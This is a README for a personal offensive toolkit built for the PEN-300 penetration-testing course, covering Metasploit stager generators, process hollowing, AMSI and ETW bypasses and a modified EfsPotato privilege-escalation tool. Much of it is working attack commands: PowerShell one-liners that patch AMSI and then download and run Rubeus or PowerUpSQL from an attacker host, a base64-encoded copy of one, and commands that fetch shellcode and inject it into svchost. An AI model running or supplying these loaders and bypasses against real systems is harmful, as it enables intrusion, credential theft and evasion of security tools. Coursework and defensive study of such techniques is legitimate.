# Tools for my PEN-300 course

* Update `interface` and `lport` in `config.yml` to your MSF (or other C2) listening IP and port before crafting any tools.
* By default, staged payloads will pull from the following URL `http://(LHOST)/sc`.
* Stageless payloads will automatically apply an XOR encryption to obfuscate the shellcode.

## All Tools

```
generate_msf_linux_exe.py
generate_tool_loader.py
generate_win_hta.py
generate_win_installutil_ps_runner.py
generate_win_js.py
generate_win_msbuild_runner.py
generate_win_msf_pe_loader.py
generate_win_msf_stager.py                  # Create stager for MSF shellcode
generate_win_util_EfsPotato.py              # Compile EfsPotato Local PrivEsc Utility
generate_win_util_MiniDump.py               # Compile MiniDump Tool
generate_win_util_PowerupSQLScript.py       # Generate PowerupSQL automation script
generate_win_util_PrintSpooferNet.py
generate_win_util_PSLessExec.py
generate_win_util_SQLAssembly.py
generate_win_util_SQLClient.py
generate_winword_macro.py
generate_win_xsl.py

```

## MSF Stager

```
usage: generate_win_msf_stager.py [-h] [--injection {hollow,interprocess,earlybird,standard}] [--format {exe,dll,aspx}] [--heuristics] [--amsi] [--etw] [--stageless] [--output OUTPUT]

optional arguments:
  -h, --help            show this help message and exit
  --injection {hollow,interprocess,earlybird,standard}, -i {hollow,interprocess,earlybird,standard}
  --format {exe,dll,aspx}, -f {exe,dll,aspx}
  --heuristics
  --amsi
  --etw
  --stageless
  --output OUTPUT, -o OUTPUT
```

### Examples

```sh
# Create a dll that will use hollowing to load shellcode
python3 generate_win_msf_stager.py --injection hollow --format dll

# Create a stageless exe that will load and run shellcode within the same process
python3 generate_win_msf_stager.py --stageless --format exe

# Create a stageless aspx
python3 generate_win_msf_stager.py --stageless --format aspx
```

## Generate Tool Loading Commands

```
usage: generate_tool_loader.py [-h] [--no-amsi] [--base64]
                               {adhunttool,evilsqlclient,winpeas,efspotato,metdll,metexe,pslessexec,rubeus,scshell,seatbelt,sharpsploit,spoolsample,sharppersist,sqlclient,sharpup,sharprdp,sharphound,adpeas,getuserspns,hostrecon,lapstoolkit,rubeus-ps,powermad,powersharppack,powerupsql,powerview,runtxt,scshell-ps,seatbelt-ps,sharphound-ps,sharpsploit-ps,sharpersist-ps,sharpkatz-ps,sharpview-ps,winpeas-ps,winpwn,sysinternals,mimikatz,chisel}

positional arguments:
  {adhunttool,evilsqlclient,winpeas,efspotato,metdll,metexe,pslessexec,rubeus,scshell,seatbelt,sharpsploit,spoolsample,sharppersist,sqlclient,sharpup,sharprdp,sharphound,adpeas,getuserspns,hostrecon,lapstoolkit,rubeus-ps,powermad,powersharppack,powerupsql,powerview,runtxt,scshell-ps,seatbelt-ps,sharphound-ps,sharpsploit-ps,sharpersist-ps,sharpkatz-ps,sharpview-ps,winpeas-ps,winpwn,sysinternals,mimikatz,chisel}

optional arguments:
  -h, --help            show this help message and exit
  --no-amsi
  --base64, -b
```

### Examples
```
# Generate command loader
$ python3 generate_tool_loader.py rubeus
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);$b=(New-object system.net.webclient).DownloadData('http://10.10.14.110/tools/Rubeus.exe');$a=[System.Reflection.Assembly]::Load($b);[Rubeus.Program]::Main("triage".Split())

# Generate command loader without AMSI bypass
$ python3 generate_tool_loader.py --no-amsi powerupsql
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit

# Base64 encode command for powershell
$ python3 generate_tool_loader.py --base64 powerupsql
Command encoded: $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);IEX(New-Object Net.WebClient).downloadString('http://10.10.14.110/tools/PowerUpSQL.ps1');Invoke-SQLAudit
powershell.exe -enc JABhAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQBzACgAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGIAIABpAG4AIAAkAGEAKQAgAHsAaQBmACAAKAAkAGIALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAGkAVQB0AGkAbABzACIAKQAgAHsAJABjAD0AJABiAH0AfQA7ACQAZAA9ACQAYwAuAEcAZQB0AEYAaQBlAGwAZABzACgAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEYAbwByAGUAYQBjAGgAKAAkAGUAIABpAG4AIAAkAGQAKQAgAHsAaQBmACAAKAAkAGUALgBOAGEAbQBlACAALQBsAGkAawBlACAAIgAqAEMAbwBuAHQAZQB4AHQAIgApACAAewAkAGYAPQAkAGUAfQB9ADsAJABnAD0AJABmAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkAOwBbAEkAbgB0AFAAdAByAF0AJABwAHQAcgA9ACQAZwA7AFsASQBuAHQAMwAyAFsAXQBdACQAYgB1AGYAIAA9ACAAQAAoADAAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAGIAdQBmACwAIAAwACwAIAAkAHAAdAByACwAIAAxACkAOwBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADAALwB0AG8AbwBsAHMALwBQAG8AdwBlAHIAVQBwAFMAUQBMAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBTAFEATABBAHUAZABpAHQA
```

## EFSPotato Local Priv Escalation
The code is forked from https://github.com/zcgonvh/EfsPotato

I modified it to pull shellcode from the URL specified in the first argument, and then use process hollowing
to start an svchost.exe process and inject the shellcode into it.

### Standard Execution
```powershell
wget http://10.10.14.110/EfsPotato.exe -o C:\windows\tasks\EfsPotato.exe
C:\windows\tasks\EfsPotato.exe http://10.10.14.110/shellcode
```

### Using Assembly Reflection
```powershell
$u="http://10.10.14.110/EfsPotato.exe"
$b=(New-object system.net.webclient).DownloadData($u)
$a=[System.Reflection.Assembly]::Load($b)
[EfsPotato.Program]::Main("http://10.10.14.110/shellcode")
```

